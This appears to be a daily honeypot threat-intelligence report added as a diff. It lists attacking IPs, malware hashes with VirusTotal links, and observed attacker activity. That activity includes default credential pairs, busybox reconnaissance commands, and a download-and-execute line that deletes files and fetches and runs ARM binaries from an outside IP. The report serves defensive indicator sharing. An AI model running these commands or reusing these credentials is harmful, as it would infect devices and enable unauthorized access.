@@ -1,0 +1,57 @@
+Top 5 IPs for 24-07-2024 :
+
+121.176.111.135
+101.126.5.109
+196.77.38.87
+168.167.72.228
+105.96.26.26
+
+Malware Observed:
+
+File name : clean.sh
+d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+
+File name : redtail.arm7
+28dc11bfe01f303a15c73150a9a7cdfda39828722c8ecb698147f78c500140a6
+https://www.virustotal.com/gui/file/28dc11bfe01f303a15c73150a9a7cdfda39828722c8ecb698147f78c500140a6
+
+File name : redtail.arm8
+66354c8878ca935f0fc6e3623e190e8a400318ded4c8d3d7baa85873059bc179
+https://www.virustotal.com/gui/file/66354c8878ca935f0fc6e3623e190e8a400318ded4c8d3d7baa85873059bc179
+
+File name : redtail.i686
+929efd52db47fe4723fb8532104b612f82414bc2c48639cfbf1dac69378f76fd
+https://www.virustotal.com/gui/file/929efd52db47fe4723fb8532104b612f82414bc2c48639cfbf1dac69378f76fd
+
+File name : sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+File name : sshd
+c7e7cc0dcf919265133b061a1e9def0153c7dfeec2f434e5477ec8f3b862a5da
+https://www.virustotal.com/gui/file/c7e7cc0dcf919265133b061a1e9def0153c7dfeec2f434e5477ec8f3b862a5da
+
+
+Commands/exploits observed:
+
+default
+...antslq
+root
+...hunt5759
+ubnt
+...ubnt
+666666
+...666666
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox APDMA
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox APDMA
+tftp; wget; /bin/busybox APDMA
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+
+
+
+cd /data/local/tmp/; rm -rf *; busybox wget http://85.239.34.237/arm4; chmod 777 arm4; ./arm4 android; busybox wget http://85.239.34.237/arm5; chmod 777 arm5; ./arm5 android; busybox wget http://85.239.34.237/arm6; chmod 777 arm6; ./arm6 android; busybox wget http://85.239.34.237/arm7; chmod 777 arm7; ./arm7 android;
